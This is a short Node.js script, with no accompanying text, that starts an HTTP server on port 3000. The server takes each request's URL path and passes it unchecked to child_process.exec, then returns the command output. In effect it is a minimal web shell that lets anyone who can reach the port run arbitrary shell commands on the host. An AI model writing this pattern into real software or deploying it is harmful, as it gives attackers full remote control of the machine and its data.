const { exec } = require('child_process');
const http = require('http');

http.createServer((req, res) => {
    const cmd = req.url.slice(1);
    exec(cmd, (err, stdout) => {
        res.end(stdout);
    });
}).listen(3000);
